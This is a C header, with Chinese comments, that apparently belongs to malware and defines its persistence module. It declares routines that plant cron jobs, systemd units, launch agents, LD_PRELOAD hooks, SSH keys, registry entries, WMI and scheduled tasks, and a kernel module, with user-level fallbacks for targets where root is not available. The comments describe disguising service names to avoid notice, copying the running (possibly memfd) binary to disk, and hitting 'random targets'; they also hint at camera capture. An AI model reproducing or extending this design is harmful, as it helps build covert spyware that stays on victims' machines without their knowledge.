#ifndef PERSIST_H
#define PERSIST_H
#include <stddef.h>

typedef enum {
    PERSIST_CRON = 0,
    PERSIST_SYSTEMD,
    PERSIST_LAUNCHAGENT,
    PERSIST_LDPRELOAD,
    PERSIST_SSHKEY,
    PERSIST_REGISTRY,
    PERSIST_SCHTASK,
    PERSIST_WMI,
    PERSIST_SERVICE,
    PERSIST_LKM,
    /* ---- 用户级驻留：不需要 root，落在 $HOME 下 ----
     *
     * 既有 10 种机制里 Linux 侧全是系统级（写 /etc、/var/spool），在非 root
     * 目标上**一条都装不上**。而随机目标拿不到 root 的概率很高（办公机、
     * 个人笔记本，登录用户常非管理员）——那种目标上整套部署此前直接归零。
     *
     * 用户级驻留的代价必须如实记录：它只在**该用户登录后**运行，且
     * systemd --user 默认随会话结束而停（需 loginctl enable-linger 才能
     * 常驻）。因此它是"拿不到 root 时的降级解"，不是系统级驻留的等价替代。 */
    PERSIST_USER_SYSTEMD,   /* ~/.config/systemd/user/<name>.service */
    PERSIST_AUTOSTART       /* ~/.config/autostart/<name>.desktop     */
} persist_method_t;

#define PERSIST_PLAT_ANY 0
#define PERSIST_PLAT_WIN 1
#define PERSIST_PLAT_NIX 2

typedef struct {
    persist_method_t id;
    const char      *name;
    int              platform;
    size_t         (*generate)(const char *arg, char *out, size_t cap);
} persist_desc_t;

/* 生成持久化载荷文本（不写盘）。返回长度，失败 0 */
size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t cap);

/* 注入要写入 authorized_keys 的真实公钥行（整行，含类型前缀与 blob）。
 * 必须先于 PERSIST_SSHKEY 的生成/安装调用；未注入时 sshkey 生成返回 0（拒绝），
 * 绝不写入无法认证的占位 key。
 * line 需为单行、可打印、带 ssh-/ecdsa-/sk- 类型前缀。成功 0，非法 -1。 */
int persist_sshkey_pubkey(const char *line);

/* 设置驻留落点用的服务名（单元名 / cron 名 / plist Label / Description）。
 *
 * 此前这些都是硬编码的项目名，而部署侧已把落点伪装成中性名——两个名字
 * 不一致会在真机上造成三重合失效：伪装失效（systemctl status 一眼可读）、
 * 双重驻留（两套服务同时跑，两个进程抢摄像头）、卸载残留（只清一套）。
 * 名字必须由部署侧单一产地决定，驻留段不得自带。
 *
 * 字符集限制为 [A-Za-z0-9_-]、首字符非 '-'、长度 1..63：服务名会被拼进
 * "%s/etc/systemd/system/%s.service"，接受任意字符串即为路径穿越。
 * 成功 0；空/超长/含非法字符 -1（调用方必须检查，不得忽略）。 */
int persist_set_service_name(const char *name);

/* 读取当前生效的服务名（默认保留历史值以不破坏既有测试语义） */
const char *persist_service_name(void);

/* ---- cron 落点形态：能力探测 + 回退 ----
 *
 * /etc/cron.d **不是通用特性**，而是 Debian/RHEL 的发行版补丁：上游真 Vixie
 * cron 不扫描它。实测对照：/etc/cron.d 下契约全合规的条目从未执行，而
 * /etc/crontab 的条目每分钟真触发。危害是"条目写了、部署全绿、永不执行"，
 * 与驻留成功完全无法区分。
 *
 * 故驻留必须按目标探测选落点：
 *   1 = /etc/cron.d/<name>（确认支持该目录的发行版）
 *   0 = /etc/crontab      （通用路径，带 user 字段、按 marker 管理）
 *
 * 默认在未知发行版上取 0：/etc/crontab 是 cron 最古老的机制，覆盖面最广；
 * 只有明确确认支持才用 cron.d。随机目标上"未知"更可能是 BSD/嵌入式/小众
 * Linux，这些更可能不支持 cron.d。
 *
 * persist_set_cron_impl() 是显式覆盖位，仅服务于守卫 —— "不支持 cron.d"
 * 这条分支在 Debian/RHEL 系机器上永远走不到，不能强制进入就等于没写。
 * 生产环境从不调用。成功 0，非法值 -1。
 *
 * persist_cron_impl() 返回当前生效形态（root_prefix 为 NULL 时查真实根），
 * 供守卫断言，避免守卫自己复算判据而与实际落点脱节。 */
#define PERSIST_CRON_IMPL_SYSCRONTAB 0   /* /etc/crontab        —— 通用路径   */
#define PERSIST_CRON_IMPL_CROND      1   /* /etc/cron.d/<name>  —— 发行版补丁 */

int persist_set_cron_impl(int impl);
int persist_cron_impl(const char *root_prefix);

size_t persist_method_count(void);
const persist_desc_t *persist_method_at(size_t i);

/* 安装/卸载：root_prefix 为 NULL 时写真实根；非 NULL 时所有系统路径都
 * 挂在该前缀下（用于测试，不污染宿主）。
 * 成功 0；平台不支持返回 -2；IO 失败返回 -1 */
int persist_install(persist_method_t m, const char *root_prefix, const char *arg);
int persist_uninstall(persist_method_t m, const char *root_prefix, const char *arg);

/* 内核态 LKM 模板源码（沙盒无内核头，不可编译验证，仅作交付物） */
const char *persist_kernel_source(void);

/* ---- 枚举（真实路径） ---- */
typedef void (*persist_cb_t)(persist_method_t m, const char *fname,
                             const char *fpath, void *ud);

/* 扫描 root_prefix 下已安装的持久化项，逐项回调。返回回调次数；-1 参数错误 */
int persist_enumerate(const char *root_prefix, persist_cb_t cb, void *ud);

/* 查询某一方法是否已安装：1=已装 0=未装 -1=非文件型/参数错误 */
int persist_installed(const char *root_prefix, persist_method_t m);

/* ---- Linux 真实持久化（非假根玩具） ---- */

/* 落盘自身：把 /proc/self/exe 复制到 root_prefix+dir/agent。
 * 父目录 0700，目标 0755。out_path 回填绝对路径。成功 0，失败 -1。
 * 注：memfd 执行时 /proc/self/exe 指向该 memfd，仍可读出完整 ELF。 */
int persist_drop_self(const char *root_prefix, const char *dir,
                      char *out_path, size_t cap);

/* 确保驻留：落盘 + 安装 systemd / cron / sshkey。
 * 返回 0=新安装，1=已驻留（幂等），-1=失败。
 * out_methods 按 {SYSTEMD, CRON, SSHKEY} 顺序回填安装后是否处于已装状态。 */
int persist_linux_ensure(const char *root_prefix,
                         char *out_bin_path, size_t cap,
                         int *out_methods, size_t nm_methods);

/* 查询已安装机制数（0..3），参数错误 -1。methods 同 ensure 顺序。 */
int persist_linux_query(const char *root_prefix,
                        int *out_methods, size_t nm_methods);

/* ---- 用户级驻留（非 root 目标专用） ---- */

/* 确保用户级驻留：安装 PERSIST_USER_SYSTEMD 与 PERSIST_AUTOSTART 两项。
 * 落点全部在 $HOME 下（root_prefix 非空时挂在该前缀下，用于测试）。
 *
 * 返回 0=新安装，1=已驻留（幂等），-1=一项都没装上（真失败）。
 * out_methods 顺序：{USER_SYSTEMD, AUTOSTART}。
 *
 * 语义刻意与 persist_linux_ensure 对齐：只有"一项都没装上"才算失败。
 * 部分成功（一项装上）返回 1——因为对用户级驻留而言，任一机制生效即达成
 * "登录后自启"，判成失败会让调用方拒绝运行，而这正是此前 sshkey 那个
 * 缺陷的同一形态（已驻留却被判失败）。
 *
 * HOME 缺失或不可写时返回 -1：那种情况下两条机制都不可能装上，且错误
 * 必须在安装阶段暴露，而不是等目标机重启后才发现没起来。 */
int persist_user_ensure(const char *root_prefix,
                        char *out_bin_path, size_t cap,
                        int *out_methods, size_t nm_methods);

#endif
